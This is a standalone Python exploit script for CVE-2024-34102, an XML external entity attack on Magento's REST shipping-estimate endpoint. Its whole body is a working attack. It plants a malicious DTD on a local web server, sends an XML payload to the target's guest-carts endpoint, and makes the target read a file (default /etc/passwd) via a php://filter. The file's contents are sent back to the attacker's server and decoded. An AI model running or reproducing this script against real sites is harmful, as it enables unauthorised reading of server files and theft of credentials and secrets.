import requests
import argparse
import re
import os
import http.server
import socketserver
import threading
import base64
import time
from urllib.parse import urlparse

def log_message(level, message):
    if level == "error":
        print(f"\033[33m[{level.upper()}] {message}\033[0m")  # error = kuning
    elif level == "info":
        print(f"\033[34m[{level.upper()}] {message}\033[0m")   # info = biru
    elif level == "warning":
        print(f"\033[31m[{level.upper()}] {message}\033[0m")  # warning = merah
    else:
        print(f"[{level.upper()}] {message}")

def sanitize_url(url):
    parsed_url = urlparse(url)
    host = re.sub(r'^www\.', '', parsed_url.netloc or parsed_url.path)
    return host.rstrip('/')

def setup_web_server(ip, port, path):
    web_dir = 'web'
    os.makedirs(web_dir, exist_ok=True)

    cuk_xml_path = os.path.join(web_dir, 'cuk.xml')
    if os.path.exists(cuk_xml_path):
        os.remove(cuk_xml_path)

    with open(cuk_xml_path, 'w') as file:
        file.write(f"""<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={path}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://{ip}:{port}/cuk.xml?%data;'>">""")

def start_http_server(port):
    os.chdir('web')

    class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if "GET /cuk.xml HTTP/1.1" in self.path:
                global last_get_request_time
                last_get_request_time = time.time()
                log_message("warning", "Target connected back to us!")
                encoded_data = self.path.split("cuk.xml?")[1].split(" ")[0]
                decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                log_message("warning", f"Received file contents:\n\n{decoded_data}")
                cleanup_and_exit()
            elif "cuk.xml" in self.path:
                log_message("warning", "Vuln !")
                if "?" in self.path:
                    encoded_data = self.path.split("cuk.xml?")[1].split(" ")[0]
                    decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                    log_message("warning", f"Received file contents:\n\n{decoded_data}")
                    cleanup_and_exit()
            super().do_GET()

    try:
        httpd = socketserver.TCPServer(("", port), CustomHTTPRequestHandler)
    except OSError as e:
        if e.errno == 98:
            log_message("error", f"Port {port} is already in use. Please use a different port.")
            cleanup_and_exit()
        else:
            raise

    log_message("info", f"Start HTTP Server on port {port}")

    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    return httpd

def send_request(url, host, ip, port):
    full_url = f"{url}/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods"
    headers = {
        "Host": host,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/json"
    }

    data = {
        "address": {
            "totalsReader": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": f"<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://{ip}:{port}/cuk.xml\"> %sp; %param1; ]> <r>&exfil;</r>",
                            "options": 16
                        }
                    }
                }
            }
        }
    }

    try:
        response = requests.post(full_url, headers=headers, json=data, timeout=10, verify=True)
        log_message("info", f"Response status code: {response.status_code}")
        if response.status_code not in [400, 401, 403, 200]:
            log_message("info", "Not Vuln !")
            cleanup_and_exit()
    except requests.RequestException as e:
        log_message("error", f"An error occurred: {e}")
        cleanup_and_exit()

def cleanup_and_exit():
    if os.path.exists('web'):
        for root, dirs, files in os.walk('web', topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir('web')
        log_message("info", "web directory and its contents removed.")
    log_message("info", "Script ended!")
    os._exit(0)

def main():
    parser = argparse.ArgumentParser(description='CVE-2024-34102')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-ip', '--ip', required=True, help='Your IP address')
    parser.add_argument('-p', '--port', required=True, type=int, help='Port for HTTP server')
    parser.add_argument('-f', '--file', default='/etc/passwd', help='Path to the file to be included in the POC')

    args = parser.parse_args()

    host = sanitize_url(args.url)
    setup_web_server(args.ip, args.port, args.file)
    httpd = start_http_server(args.port)

    try:
        while True:
            send_request(args.url, host, args.ip, args.port)
            time.sleep(1)
    except KeyboardInterrupt:
        log_message("info", "Keyboard interrupt received. Exiting...")
        cleanup_and_exit()

if __name__ == "__main__":
    main()
